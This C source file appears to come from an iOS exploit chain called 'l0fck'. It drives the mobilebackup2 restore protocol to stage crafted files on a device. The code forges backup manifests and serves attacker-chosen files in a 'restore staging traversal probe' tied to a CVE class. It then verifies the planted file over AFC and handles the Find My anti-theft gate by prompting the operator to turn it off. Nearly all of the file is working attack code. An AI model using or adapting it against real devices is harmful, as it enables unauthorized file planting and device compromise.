#include "l0fck.h"
#include "backup/mb2_restore.h"
#include "lockdown/session_manager.h"
#include "lockdown/afc_manager.h"
#include "exploits/springboard_injector.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>

/* ========================================================================== */
/* Host-testable synthesizers                                                  */
/* ========================================================================== */

void mb2_canary_content(char *buf, size_t buf_len, const char *tag)
{
    if (!buf || buf_len == 0) return;
    const char *t = tag ? tag : "trav";
    snprintf(buf, buf_len,
             "l0fck-restore-chain canary %s @ %ld "
             "(CVE-2026-84598 class, restore staging traversal probe)\n",
             t, (long)time(NULL));
}

/* Write a plist node to an allocated binary (bplist00) buffer. */
static int plist_to_binary_mem(plist_t node, uint8_t **out, size_t *out_len)
{
    if (!node || !out || !out_len) return -1;
    *out = NULL;
    *out_len = 0;
    char *base = NULL;
    FILE *mem = open_memstream(&base, out_len);
    if (!mem) return -1;
    if (plist_write_to_stream(node, mem, PLIST_FORMAT_BINARY, 0) != PLIST_ERR_SUCCESS) {
        fclose(mem);
        free(base);
        return -1;
    }
    fclose(mem);
    if (!base || *out_len == 0) {
        free(base);
        return -1;
    }
    *out = (uint8_t *)base;
    return 0;
}

int mb2_synthesize_manifest_plist(uint8_t **out, size_t *out_len)
{
    if (!out || !out_len) return -1;
    *out = NULL;
    *out_len = 0;

    plist_t root = plist_new_dict();
    plist_dict_set_item(root, "Version", plist_new_string(MB2_MANIFEST_VERSION));
    plist_dict_set_item(root, "SystemDomainsVersion", plist_new_string(MB2_SYS_DOMAINS_VERSION));
    plist_dict_set_item(root, "ProductVersion", plist_new_string(TARGET_OS_VERSION));
    plist_dict_set_item(root, "BuildVersion", plist_new_string(TARGET_BUILD_VERSION));
    plist_dict_set_item(root, "IsEncrypted", plist_new_bool(false));

    int rc = plist_to_binary_mem(root, out, out_len);
    plist_free(root);
    return rc;
}

/* Write one C string as an mbdb u16-length-prefixed LE field. */
static size_t mb2_put_string(uint8_t *dst, const char *s)
{
    uint16_t l = (uint16_t)strlen(s ? s : "");
    dst[0] = (uint8_t)(l & 0xff);
    dst[1] = (uint8_t)((l >> 8) & 0xff);
    memcpy(dst + 2, s ? s : "", l);
    return 2 + (size_t)l;
}

static size_t mb2_put_u32(uint8_t *dst, uint32_t v)
{
    dst[0] = (uint8_t)(v & 0xff);
    dst[1] = (uint8_t)((v >> 8) & 0xff);
    dst[2] = (uint8_t)((v >> 16) & 0xff);
    dst[3] = (uint8_t)((v >> 24) & 0xff);
    return 4;
}

int mb2_synthesize_mbdb(const mb2_staged_file_t *entries, size_t count,
                        uint8_t **out, size_t *out_len)
{
    if (!entries || count == 0 || !out || !out_len) return -1;
    *out = NULL;
    *out_len = 0;

    /* Reserve a generous workspace; worst case ~4.5KB of fixed fields per entry */
    size_t cap = 16 + count * (sizeof(mb2_staged_file_t) + 4096);
    uint8_t *buf = (uint8_t *)malloc(cap);
    if (!buf) return -1;

    /* Header: magic + major + count */
    uint8_t *p = buf;
    memcpy(p, "mbdb", 4); p += 4;
    mb2_put_u32(p, MB2_MBDV_MAJOR); p += 4;
    p[0] = (uint8_t)(count & 0xff);
    p[1] = (uint8_t)((count >> 8) & 0xff);
    p += 2;

    for (size_t i = 0; i < count; i++) {
        const mb2_staged_file_t *e = &entries[i];

        p += mb2_put_string(p, e->domain);
        p += mb2_put_string(p, e->path);
        p += mb2_put_string(p, "");            /* linktarget: none */

        /* datahash: 16 bytes derived from content (leading bytes of payload) */
        uint8_t hash[16] = {0};
        if (e->len > 0 && e->content[0]) {
            size_t n = e->len < 16 ? e->len : 16;
            memcpy(hash, e->content, n);
        }
        memcpy(p, hash, 16); p += 16;

        mb2_put_u32(p, 0); p += 4;              /* unknown */
        mb2_put_u32(p, 0x81b6); p += 4;         /* mode: S_IFREG | 0766 */
        mb2_put_u32(p, 0); p += 4;              /* inode */
        mb2_put_u32(p, 501); p += 4;            /* uid: mobile */
        mb2_put_u32(p, 501); p += 4;            /* gid: mobile */
        mb2_put_u32(p, 0); p += 4;              /* atime */
        mb2_put_u32(p, 0); p += 4;              /* mtime */
        mb2_put_u32(p, 0); p += 4;              /* ctime */
        mb2_put_u32(p, e->len); p += 4;         /* len */
        mb2_put_u32(p, 0); p += 4;              /* flags */

        /* props: binary plist { FileSize, FileHash, FileUUID } */
        plist_t props = plist_new_dict();
        plist_dict_set_item(props, "FileSize", plist_new_uint(e->len));
        uint8_t uuid[16];
        for (int b = 0; b < 16; b++) uuid[b] = (uint8_t)(0xA5 ^ (b + (int)i));
        plist_dict_set_item(props, "FileHash", plist_new_data((const char *)uuid, 16));
        char uuid_str[48] = {0};
        snprintf(uuid_str, sizeof(uuid_str),
                 "l0fck-restore-%04llx-%04llx",
                 (unsigned long long)(e->len ^ 0x5eed),
                 (unsigned long long)i);
        plist_dict_set_item(props, "FileUUID", plist_new_string(uuid_str));

        uint8_t *pp = NULL;
        size_t plen = 0;
        if (plist_to_binary_mem(props, &pp, &plen) != 0) {
            plist_free(props);
            free(buf);
            return -1;
        }
        plist_free(props);
        mb2_put_u32(p, (uint32_t)plen); p += 4;
        memcpy(p, pp, plen); p += plen;
        free(pp);
    }

    /* Footer: count + 0xffffffff */
    p[0] = (uint8_t)(count & 0xff);
    p[1] = (uint8_t)((count >> 8) & 0xff);
    p += 2;
    mb2_put_u32(p, 0xffffffffu); p += 4;

    *out = buf;
    *out_len = (size_t)(p - buf);
    return 0;
}

/* --- mbdb reader (validation helper) --- */

static size_t mb2_get_string(const uint8_t *src, const uint8_t **next, char *dst, size_t dst_len)
{
    if (!src) return 0;
    uint16_t l = (uint16_t)(src[0] | (src[1] << 8));
    if (dst && dst_len > 0) {
        size_t n = l < dst_len - 1 ? l : dst_len - 1;
        memcpy(dst, src + 2, n);
        dst[n] = '\0';
    }
    *next = src + 2 + l;
    return 2 + (size_t)l;
}

int mb2_parse_mbdb(const uint8_t *data, size_t len,
                   mb2_staged_file_t **out_entries, size_t *out_count)
{
    if (!data || len < 16 || !out_entries || !out_count) return -1;
    *out_entries = NULL;
    *out_count = 0;

    if (memcmp(data, "mbdb", 4) != 0) return -1;
    uint32_t major = data[4] | (data[5] << 8) | (data[6] << 16) | ((uint32_t)data[7] << 24);
    uint16_t count = (uint16_t)(data[8] | (data[9] << 8));
    if (major != MB2_MBDV_MAJOR || count == 0) return -1;

    mb2_staged_file_t *es = (mb2_staged_file_t *)calloc(count, sizeof(mb2_staged_file_t));
    if (!es) return -1;

    const uint8_t *p = data + 10;
    const uint8_t *end = data + len;
    for (uint16_t i = 0; i < count; i++) {
        if (p + 100 > end) { free(es); return -1; }
        mb2_get_string(p, &p, es[i].domain, sizeof(es[i].domain));
        mb2_get_string(p, &p, es[i].path, sizeof(es[i].path));
        mb2_get_string(p, &p, NULL, 0);     /* linktarget: skip */
        if (p + 16 > end) { free(es); return -1; }
        p += 16;   /* datahash */
        p += 4;    /* unknown */
        p += 4;    /* mode */
        p += 4;    /* inode */
        p += 4;    /* uid */
        p += 4;    /* gid */
        p += 4;    /* atime */
        p += 4;    /* mtime */
        p += 4;    /* ctime */
        if (p + 4 > end) { free(es); return -1; }
        es[i].len = p[0] | (p[1] << 8) | (p[2] << 16) | ((uint32_t)p[3] << 24);
        p += 4;
        p += 4;    /* flags */
        if (p + 4 > end) { free(es); return -1; }
        uint32_t plen = p[0] | (p[1] << 8) | (p[2] << 16) | ((uint32_t)p[3] << 24);
        p += 4;
        if (p + plen > end) { free(es); return -1; }
        p += plen; /* props */
    }

    *out_entries = es;
    *out_count = count;
    return 0;
}

void mb2_free_mbdb_entries(mb2_staged_file_t *entries)
{
    free(entries);
}

/* ========================================================================== */
/* Live restore flow                                                           */
/* ========================================================================== */

static void mb2_dump_dir_ensure(void)
{
    mkdir(MB2_DUMPDIR, 0755);
}

static void mb2_dump_plist(const char *tag, plist_t pl)
{
    if (!pl) return;
    mb2_dump_dir_ensure();
    char *xml = NULL;
    uint32_t len = 0;
    if (plist_to_xml(pl, &xml, &len) == PLIST_ERR_SUCCESS && xml) {
        char path[320];
        snprintf(path, sizeof(path), MB2_DUMPDIR "/msg_%s_%ld.xml",
                 tag ? tag : "x", (long)time(NULL));
        FILE *f = fopen(path, "wb");
        if (f) {
            fwrite(xml, 1, len, f);
            fclose(f);
        }
        free(xml);
    }
    LOG_DEBUG("mb2: dumped message '%s' to %s", tag ? tag : "?", MB2_DUMPDIR);
}

/* Build the Restore request options dict (no reboot: we finalize in-session). */
static plist_t mb2_restore_options(void)
{
    plist_t o = plist_new_dict();
    plist_dict_set_item(o, "RestoreShouldReboot", plist_new_bool(false));
    plist_dict_set_item(o, "RestoreDontCopyBackup", plist_new_bool(true));
    return o;
}

/* Minimal Info.plist bytes, generated on demand if the device requests it. */
static int mb2_synthesize_info_plist(l0fck_session_t *sess, uint8_t **out, size_t *out_len)
{
    if (!out || !out_len) return -1;
    *out = NULL;
    *out_len = 0;

    plist_t root = plist_new_dict();
    plist_dict_set_item(root, "Product Type", plist_new_string(TARGET_MODEL_1));
    plist_dict_set_item(root, "Product Version", plist_new_string(TARGET_OS_VERSION));
    plist_dict_set_item(root, "Build Version", plist_new_string(TARGET_BUILD_VERSION));
    plist_dict_set_item(root, "Unique Identifier",
                        plist_new_string(sess && sess->info.udid[0] ? sess->info.udid : "00000000-0000000000000000"));
    plist_dict_set_item(root, "Target Identifier",
                        plist_new_string(sess && sess->info.udid[0] ? sess->info.udid : "00000000-0000000000000000"));
    plist_dict_set_item(root, "Target Type", plist_new_string("Device"));

    int rc = plist_to_binary_mem(root, out, out_len);
    plist_free(root);
    return rc;
}

/* Serve one file over the DL file-stream wire format:
 * [u32 BE name_len][name] then [u32 BE frame_len][u8 code][data]* then
 * [u32 BE 1][u8 0] (CODE_SUCCESS terminator). */
static int mb2_send_file_stream(mobilebackup2_client_t client, const char *name,
                                const uint8_t *data, uint32_t len)
{
    if (!client || !name || (!data && len > 0)) return -1;

    uint32_t nlen = (uint32_t)strlen(name);
    uint8_t hdr[4];
    hdr[0] = (nlen >> 24) & 0xff;
    hdr[1] = (nlen >> 16) & 0xff;
    hdr[2] = (nlen >> 8) & 0xff;
    hdr[3] = nlen & 0xff;
    uint32_t sent = 0;
    if (mobilebackup2_send_raw(client, (const char *)hdr, 4, &sent) != MOBILEBACKUP2_E_SUCCESS ||
        mobilebackup2_send_raw(client, name, nlen, &sent) != MOBILEBACKUP2_E_SUCCESS) {
        return -1;
    }

    const uint32_t frame_max = 32 * 1024;
    uint32_t offset = 0;
    while (offset < len) {
        uint32_t chunk = len - offset;
        if (chunk > frame_max) chunk = frame_max;
        uint8_t fhdr[5];
        uint32_t flen = chunk + 1;
        fhdr[0] = (flen >> 24) & 0xff;
        fhdr[1] = (flen >> 16) & 0xff;
        fhdr[2] = (flen >> 8) & 0xff;
        fhdr[3] = flen & 0xff;
        fhdr[4] = 0x0C;   /* CODE_FILE_DATA */
        if (mobilebackup2_send_raw(client, (const char *)fhdr, 5, &sent) != MOBILEBACKUP2_E_SUCCESS ||
            mobilebackup2_send_raw(client, (const char *)data + offset, chunk, &sent) != MOBILEBACKUP2_E_SUCCESS) {
            return -1;
        }
        offset += chunk;
    }

    /* Empty frame with CODE_SUCCESS terminates the file. */
    uint8_t done[5] = {0x00, 0x00, 0x00, 0x01, 0x00};
    return mobilebackup2_send_raw(client, (const char *)done, 5, &sent) == MOBILEBACKUP2_E_SUCCESS ? 0 : -1;
}

static void mb2_send_file_terminator(mobilebackup2_client_t client)
{
    uint8_t term[4] = {0x00, 0x00, 0x00, 0x00};
    uint32_t sent = 0;
    mobilebackup2_send_raw(client, (const char *)term, 4, &sent);
}

/* Look up a file the device requested from our in-memory crafted set, or
 * generate one of the known metadata files on demand.
 * Returns 0 on success; the data pointer is either an in-memory staged entry
 * or a freshly-allocated buffer that the caller frees via out_owned. */
static int mb2_resolve_requested_file(l0fck_session_t *sess, const mb2_staged_file_t *staged,
                                      size_t staged_count, const char *name,
                                      uint8_t **out, uint32_t *out_len, char **out_owned)
{
    if (!name || !out || !out_len) return -1;
    *out = NULL;
    *out_len = 0;
    *out_owned = NULL;

    if (strcmp(name, "Manifest.plist") == 0) {
        uint8_t *b = NULL;
        size_t l = 0;
        if (mb2_synthesize_manifest_plist(&b, &l) != 0) return -1;
        *out = b;
        *out_len = (uint32_t)l;
        *out_owned = (char *)b;
        return 0;
    }
    if (strcmp(name, "Manifest.mbdb") == 0) {
        if (staged_count == 0) return -1;
        uint8_t *b = NULL;
        size_t l = 0;
        if (mb2_synthesize_mbdb(staged, staged_count, &b, &l) != 0) return -1;
        *out = b;
        *out_len = (uint32_t)l;
        *out_owned = (char *)b;
        return 0;
    }
    if (strcmp(name, "Info.plist") == 0) {
        uint8_t *b = NULL;
        size_t l = 0;
        if (mb2_synthesize_info_plist(sess, &b, &l) != 0) return -1;
        *out = b;
        *out_len = (uint32_t)l;
        *out_owned = (char *)b;
        return 0;
    }

    for (size_t i = 0; i < staged_count; i++) {
        if (strcmp(staged[i].path, name) == 0) {
            *out = (uint8_t *)staged[i].content;
            *out_len = staged[i].len;
            return 0;
        }
    }
    return -1;
}

/* Send DLMessageStatusResponse with an optional per-file status map. */
static int mb2_send_status(mobilebackup2_client_t client, uint64_t code,
                           const char *status1, plist_t extra)
{
    plist_t arr = plist_new_array();
    plist_array_append_item(arr, plist_new_string("DLMessageStatusResponse"));
    plist_array_append_item(arr, plist_new_uint(code));
    plist_array_append_item(arr, plist_new_string(status1 ? status1 : "___EmptyParameterString___"));
    if (extra) {
        plist_array_append_item(arr, plist_copy(extra));
    } else {
        plist_array_append_item(arr, plist_new_string("___EmptyParameterString___"));
    }
    mobilebackup2_error_t err = mobilebackup2_send_message(client, NULL, arr);
    plist_free(arr);
    return err == MOBILEBACKUP2_E_SUCCESS ? 0 : -1;
}

/* Serve a DLMessageDownloadFiles request from our crafted set. */
static int mb2_handle_download_files(mobilebackup2_client_t client, l0fck_session_t *sess,
                                     const mb2_staged_file_t *staged, size_t staged_count,
                                     plist_t file_list)
{
    if (!file_list || plist_get_node_type(file_list) != PLIST_ARRAY) {
        return mb2_send_status(client, 1, "InvalidDownloadFiles", NULL);
    }
    uint32_t n = plist_array_get_size(file_list);
    plist_t errors = NULL;

    LOG_INFO("mb2: DLMessageDownloadFiles — device requests %u file(s)", n);
    for (uint32_t i = 0; i < n; i++) {
        const char *fname = NULL;
        plist_t node = plist_array_get_item(file_list, i);
        if (node && plist_get_node_type(node) == PLIST_STRING) {
            plist_get_string_val(node, (char **)&fname);
        }
        if (!fname) continue;

        LOG_INFO("mb2:   serving '%s'", fname);

        uint8_t *data = NULL;
        uint32_t dlen = 0;
        char *owned = NULL;
        if (mb2_resolve_requested_file(sess, staged, staged_count, fname, &data, &dlen, &owned) != 0 || !data) {
            LOG_WARN("mb2:   no crafted file for '%s' — reporting local error", fname);
            if (!errors) errors = plist_new_dict();
            plist_t fe = plist_new_dict();
            plist_dict_set_item(fe, "DLFileErrorCode", plist_new_uint(6));
            plist_dict_set_item(fe, "DLFileErrorString", plist_new_string("No such file"));
            plist_dict_set_item(errors, fname, fe);
            continue;
        }

        if (mb2_send_file_stream(client, fname, data, dlen) != 0) {
            LOG_ERROR("mb2:   file stream send failed for '%s'", fname);
        }
        if (owned) free(owned);
    }

    mb2_send_file_terminator(client);
    if (errors) {
        int rc = mb2_send_status(client, -13, "Multi status", errors);
        plist_free(errors);
        return rc;
    }
    return mb2_send_status(client, 0, "___EmptyParameterString___", NULL);
}

/* Recursively scan a response node for the Find My anti-theft gate
 * (MBErrorDomain/211 or a "Find My ... must be disabled" string). */
static bool mb2_is_findmy_gate(plist_t node)
{
    if (!node) return false;

    plist_type t = plist_get_node_type(node);
    if (t == PLIST_DICT) {
        plist_t code = plist_dict_get_item(node, "Code");
        uint64_t c = 0;
        if (code && (plist_get_node_type(code) == PLIST_INT || plist_get_node_type(code) == PLIST_UINT)) {
            plist_get_uint_val(code, &c);
            if (c == MB2_GATE_FIND_MY_CODE) return true;
        }
        plist_dict_iter it = NULL;
        plist_dict_new_iter(node, &it);
        char *key = NULL;
        plist_t val = NULL;
        do {
            plist_dict_next_item(node, it, &key, &val);
            bool hit = val && mb2_is_findmy_gate(val);
            free(key);
            if (hit) {
                plist_dict_free_iter(it);
                return true;
            }
        } while (val);
        plist_dict_free_iter(it);
        return false;
    }
    if (t == PLIST_ARRAY) {
        uint32_t sz = plist_array_get_size(node);
        for (uint32_t i = 0; i < sz; i++) {
            if (mb2_is_findmy_gate(plist_array_get_item(node, i))) return true;
        }
        return false;
    }
    if (t == PLIST_STRING) {
        char *s = NULL;
        plist_get_string_val(node, &s);
        bool hit = s && (strcasestr(s, "Find My") || strcasestr(s, "must be disabled") ||
                         strcasestr(s, "211"));
        free(s);
        return hit;
    }
    return false;
}

/* One restore round: fresh mb2 client, Hello exchange, Restore request,
 * drive the DL loop serving our crafted files.
 * Returns:
 *   0   — restore flow completed / passed all gates into file staging
 *   211 — anti-theft gate (Find My on)
 *   -1  — protocol error / wedge / connection failure
 *   other — device error code */
static int restore_one_round(l0fck_session_t *sess, const mb2_staged_file_t *staged,
                             size_t staged_count, int round, char *errbuf, size_t errlen)
{
    errbuf[0] = '\0';

    mobilebackup2_client_t client = NULL;
    mobilebackup2_error_t cerr = mobilebackup2_client_start_service(sess->dev, &client, "l0fck");
    if (cerr != MOBILEBACKUP2_E_SUCCESS || !client) {
        /* -256 (SERVICE_E_UNKNOWN_ERROR) swallows the real reason — probe the
         * underlying lockdown start to surface it for diagnosis. */
        lockdownd_service_descriptor_t probe_desc = NULL;
        lockdownd_error_t plerr = LOCKDOWN_E_INVALID_ARG;
        if (sess->ld) {
            plerr = lockdownd_start_service(sess->ld, "com.apple.mobilebackup2", &probe_desc);
            if (plerr == LOCKDOWN_E_SESSION_INACTIVE) {
                plerr = lockdownd_start_service_with_escrow_bag(sess->ld, "com.apple.mobilebackup2", &probe_desc);
            }
            if (probe_desc) lockdownd_service_descriptor_free(probe_desc);
        }
        const char *reason = "daemon may be wedged (reboot required)";
        int wedge = 1;
        switch (plerr) {
        case LOCKDOWN_E_SUCCESS:
            /* lockdownd handed out the mb2 socket but the client-side
             * device-link version exchange hung/failed — the signature of a
             * wedged daemon (reboot required). */
            reason = "lockdown handed out the mb2 socket but the client handshake failed — daemon-wedge signature";
            wedge = 1; break;
        case LOCKDOWN_E_SESSION_INACTIVE:        reason = "lockdown session inactive (-23) — service not reachable under this pairing"; wedge = 0; break;
        case LOCKDOWN_E_SESSION_ACTIVE:          reason = "lockdown session already active (-22) — prior mb2 socket not torn down"; wedge = 0; break;
        case LOCKDOWN_E_MISSING_SERVICE:         reason = "service not registered by lockdownd (-26)"; wedge = 0; break;
        case LOCKDOWN_E_INVALID_SERVICE:         reason = "service rejected by lockdownd (-27)"; wedge = 0; break;
        case LOCKDOWN_E_SERVICE_LIMIT:           reason = "service limit reached (-28)"; wedge = 0; break;
        case LOCKDOWN_E_FMIP_PROTECTED:          reason = "FMIP-protected (-37) — Find My may still be on"; wedge = 0; break;
        case LOCKDOWN_E_PASSWORD_PROTECTED:      reason = "password-protected (-17)"; wedge = 0; break;
        case LOCKDOWN_E_ESCROW_LOCKED:           reason = "escrow bag locked (-35)"; wedge = 0; break;
        default: break;
        }
        snprintf(errbuf, errlen,
                 "mobilebackup2 client start failed (code %d) [lockdown=%d: %s]%s",
                 (int)cerr, (int)plerr, reason,
                 wedge ? " — daemon may be wedged, reboot required" : " (service unreachable)");
        return -1;
    }

    /* MB2 Hello / version exchange (device-link exchange already done in client_new) */
    plist_t hello = plist_new_dict();
    plist_t versions = plist_new_array();
    plist_array_append_item(versions, plist_new_real(2.0));
    plist_array_append_item(versions, plist_new_real(2.1));
    plist_dict_set_item(hello, "SupportedProtocolVersions", versions);

    if (mobilebackup2_send_message(client, "Hello", hello) != MOBILEBACKUP2_E_SUCCESS) {
        snprintf(errbuf, errlen, "Hello send failed");
        plist_free(hello);
        mobilebackup2_client_free(client);
        return -1;
    }
    plist_free(hello);

    plist_t resp = NULL;
    char *dlname = NULL;
    mobilebackup2_error_t rerr = mobilebackup2_receive_message(client, &resp, &dlname);
    if (rerr != MOBILEBACKUP2_E_SUCCESS || !resp) {
        snprintf(errbuf, errlen, "Hello response timed out or failed (%d) — daemon may be wedged, reboot required", (int)rerr);
        free(dlname);
        mobilebackup2_client_free(client);
        return -1;
    }
    free(dlname);

    /* Verify Hello response shape; dump for protocol diffing */
    mb2_dump_plist("hello_resp", resp);
    plist_t content = NULL;
    if (plist_get_node_type(resp) == PLIST_ARRAY) {
        uint32_t asz = plist_array_get_size(resp);
        content = asz > 1 ? plist_array_get_item(resp, 1) : NULL;
    }
    if (content) {
        plist_t ec = plist_dict_get_item(content, "ErrorCode");
        uint64_t ecv = 0;
        if (ec && (plist_get_node_type(ec) == PLIST_INT || plist_get_node_type(ec) == PLIST_UINT)) {
            plist_get_uint_val(ec, &ecv);
        }
        if (ecv != 0) {
            snprintf(errbuf, errlen, "Hello response ErrorCode %llu (protocol mismatch)", (unsigned long long)ecv);
            plist_free(resp);
            mobilebackup2_client_free(client);
            return -1;
        }
        plist_t pv = plist_dict_get_item(content, "ProtocolVersion");
        if (pv && plist_get_node_type(pv) == PLIST_REAL) {
            double v = 0;
            plist_get_real_val(pv, &v);
            LOG_INFO("mb2: MB2 protocol version %.1f (round %d)", v, round);
        }
    }
    plist_free(resp);

    /* Send Restore request */
    plist_t opts = mb2_restore_options();
    const char *udid = sess->info.udid[0] ? sess->info.udid : "00000000-0000000000000000";
    rerr = mobilebackup2_send_request(client, "Restore", udid, udid, opts);
    plist_free(opts);
    if (rerr != MOBILEBACKUP2_E_SUCCESS) {
        snprintf(errbuf, errlen, "Restore request send failed (%d)", (int)rerr);
        mobilebackup2_client_free(client);
        return -1;
    }
    LOG_INFO("mb2: Restore request sent (round %d), driving DL loop...", round);

    /* DL loop */
    for (int loop = 0; loop < 64; loop++) {
        plist_t msg = NULL;
        dlname = NULL;
        rerr = mobilebackup2_receive_message(client, &msg, &dlname);
        free(dlname);
        if (rerr != MOBILEBACKUP2_E_SUCCESS || !msg) {
            snprintf(errbuf, errlen, "DL message receive failed (%d) after Restore — possible wedge", (int)rerr);
            mobilebackup2_client_free(client);
            return -1;
        }
        mb2_dump_plist("dl", msg);

        const char *cmd = NULL;
        if (plist_get_node_type(msg) == PLIST_ARRAY && plist_array_get_size(msg) > 0) {
            plist_t cmdnode = plist_array_get_item(msg, 0);
            if (cmdnode && plist_get_node_type(cmdnode) == PLIST_STRING) {
                plist_get_string_val(cmdnode, (char **)&cmd);
            }
        }
        if (!cmd) {
            plist_free(msg);
            continue;
        }
        LOG_INFO("mb2: <- %s", cmd);

        if (strcmp(cmd, "DLMessageDownloadFiles") == 0) {
            plist_t list = plist_array_get_size(msg) > 1 ? plist_array_get_item(msg, 1) : NULL;
            if (mb2_handle_download_files(client, sess, staged, staged_count, list) != 0) {
                snprintf(errbuf, errlen, "file serving failed");
                plist_free(msg);
                mobilebackup2_client_free(client);
                return -1;
            }
            plist_free(msg);
            continue;
        }
        if (strcmp(cmd, "DLMessageGetFreeDiskSpace") == 0) {
            plist_t extra = plist_new_uint(8ULL * 1024 * 1024 * 1024);
            mb2_send_status(client, 0, "___EmptyParameterString___", extra);
            plist_free(extra);
            plist_free(msg);
            continue;
        }
        if (strcmp(cmd, "DLMessagePurgeDiskSpace") == 0) {
            plist_t zero = plist_new_uint(0);
            mb2_send_status(client, 1, "DLPurgeDiskSpace failed to purge", zero);
            plist_free(zero);
            plist_free(msg);
            continue;
        }
        if (strcmp(cmd, "DLMessageCreateDirectory") == 0 ||
            strcmp(cmd, "DLMessageRemoveItems") == 0 ||
            strcmp(cmd, "DLMessageMoveItems") == 0 ||
            strcmp(cmd, "DLMessageCopyItem") == 0 ||
            strcmp(cmd, "DLMessageContentsOfDirectory") == 0) {
            mb2_send_status(client, 0, "___EmptyParameterString___", NULL);
            plist_free(msg);
            continue;
        }
        if (strcmp(cmd, "DLMessageProcessMessage") == 0) {
            plist_t body = plist_array_get_size(msg) > 1 ? plist_array_get_item(msg, 1) : NULL;
            uint64_t ecv = 0;
            bool findmy = false;
            if (body) {
                plist_t ec = plist_dict_get_item(body, "ErrorCode");
                if (ec && (plist_get_node_type(ec) == PLIST_INT || plist_get_node_type(ec) == PLIST_UINT)) {
                    plist_get_uint_val(ec, &ecv);
                }
                plist_t ct = plist_dict_get_item(body, "Content");
                findmy = mb2_is_findmy_gate(ct);
            }
            plist_free(msg);
            if (findmy) {
                snprintf(errbuf, errlen, "anti-theft gate: Find My must be disabled (MBErrorDomain/%d)",
                         MB2_GATE_FIND_MY_CODE);
                mobilebackup2_client_free(client);
                return MB2_GATE_FIND_MY_CODE;
            }
            if (ecv != 0) {
                snprintf(errbuf, errlen, "restore failed: ErrorCode %llu", (unsigned long long)ecv);
                mobilebackup2_client_free(client);
                return (int)ecv;
            }
            LOG_SUCCESS("mb2: restore flow completed (round %d)", round);
            mobilebackup2_client_free(client);
            return 0;
        }

        /* Unknown message: log, drain, keep the loop going */
        LOG_WARN("mb2: unhandled DL message '%s' (round %d, iter %d) — see %s", cmd, round, loop, MB2_DUMPDIR);
        plist_free(msg);
        usleep(50000);
        if (loop == 63) {
            snprintf(errbuf, errlen, "DL loop exhausted without completion (possible wedge)");
            mobilebackup2_client_free(client);
            return -1;
        }
    }

    mobilebackup2_client_free(client);
    snprintf(errbuf, errlen, "DL loop exhausted");
    return -1;
}

/* Operator prompt + bounded wait on interactive TTY. Non-interactive runs
 * fail the gate instead of hanging. */
static bool operator_confirm_findmy_off(int round)
{
    printf("\n" ANSI_COLOR_YELLOW ANSI_COLOR_BOLD "============================================================" ANSI_COLOR_RESET "\n");
    printf(" " ANSI_COLOR_YELLOW "ANTI-THEFT GATE (MBErrorDomain/211): Find My is still on.\n"
                        " To disable it on the device:\n"
                        "   1. Press Volume Down + Power together for a couple seconds\n"
                        "   2. On the 'Turn off' screen, tap the Find My off button\n"
                        "      (Apple ID confirmation fully releases it)\n"
                        " Then press [Enter] to retry the restore (round %d/%d)." ANSI_COLOR_RESET "\n",
           round, MB2_RETRY_ROUNDS);
    printf(" " ANSI_COLOR_RED "[q] to abort the chain." ANSI_COLOR_RESET "\n");
    printf(" " ANSI_COLOR_BOLD "Proceed? [Y/n/q]: " ANSI_COLOR_RESET);

    if (!isatty(STDIN_FILENO)) {
        LOG_WARN("Non-interactive terminal — cannot prompt for Find My disable.");
        return false;
    }
    char line[64] = {0};
    if (!fgets(line, sizeof(line), stdin)) return false;
    if (line[0] == 'q' || line[0] == 'Q') return false;
    return true;
}

static bool operator_confirm_reboot(int round)
{
    printf("\n" ANSI_COLOR_YELLOW ANSI_COLOR_BOLD "============================================================" ANSI_COLOR_RESET "\n");
    printf(" " ANSI_COLOR_YELLOW "mb2 daemon appears WEDGED (no response to restore handshake).\n"
                        " The daemon only recovers on device reboot.\n"
                        " Press [Enter] to reboot the device now (round %d/%d)," ANSI_COLOR_RESET "\n", round, MB2_RETRY_ROUNDS);
    printf(" " ANSI_COLOR_RED "[q] to abort the chain." ANSI_COLOR_RESET "\n");
    printf(" " ANSI_COLOR_BOLD "Reboot? [Y/n/q]: " ANSI_COLOR_RESET);

    if (!isatty(STDIN_FILENO)) {
        LOG_WARN("Non-interactive terminal — cannot prompt for device reboot.");
        return false;
    }
    char line[64] = {0};
    if (!fgets(line, sizeof(line), stdin)) return false;
    if (line[0] == 'q' || line[0] == 'Q') return false;
    return true;
}

static int wait_for_device_back(l0fck_session_t *sess, int seconds)
{
    /* The previous run falsely reported "back online after 1s" because the
     * device never actually rebooted (diagnostics_relay failed). Detect a
     * genuine disconnect first: tear down the session and require the muxd
     * connection to actually drop before we call the device "back".
     * Returns 1 if the device genuinely cycled (offline → online), else 0. */
    session_disconnect(sess);
    usleep(500000);

    bool saw_offline = false;
    for (int i = 0; i < 5; i++) {
        if (session_connect(sess) != 0 || !sess->is_connected) {
            saw_offline = true;
            break;
        }
        session_disconnect(sess);
        usleep(500000);
    }
    if (!saw_offline) {
        LOG_WARN("Device did NOT go offline after reboot command — reboot may not "
                 "have executed (diagnostics_relay unavailable). A genuine "
                 "daemon-wedge recovery requires a real device reboot: power "
                 "button → slide to power off → power on, then retry.");
        return 0;
    }

    for (int i = 0; i < seconds; i++) {
        sleep(1);
        if (session_connect(sess) == 0 && sess->is_connected) {
            LOG_SUCCESS("Device back online after %ds.", i + 1);
            return 1;
        }
    }
    LOG_WARN("Device not reachable after %ds wait.", seconds);
    return 0;
}

/* Stage-4: verify a staged file actually landed on device via plain AFC. */
static int verify_staged_file(l0fck_session_t *sess, const char *afc_probe_path,
                              const char *expected_tag, char *out_path, size_t out_len)
{
    afc_client_t afc = NULL;
    if (session_get_afc_client(sess, &afc) != 0 || !afc) {
        if (out_path && out_len > 0) snprintf(out_path, out_len, "AFC unavailable");
        return -1;
    }
    int found = -1;
    char **list = NULL;
    if (afc_read_directory(afc, afc_probe_path, &list) == AFC_E_SUCCESS && list) {
        for (int i = 0; list[i] != NULL; i++) {
            if (strstr(list[i], "l0fck-restore") || strstr(list[i], expected_tag)) {
                if (out_path && out_len > 0) {
                    snprintf(out_path, out_len, "%s%s",
                             afc_probe_path[0] == '/' ? "" : afc_probe_path, list[i]);
                }
                found = 0;
                break;
            }
        }
        afc_dictionary_free(list);
    }
    afc_client_free(afc);
    return found;
}

/* ========================================================================== */
/* Chain entry points                                                          */
/* ========================================================================== */

static void restore_print_summary(const restore_chain_status_t *s)
{
    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_MAGENTA "============ RESTORE-CHAIN SUMMARY ============" ANSI_COLOR_RESET "\n");
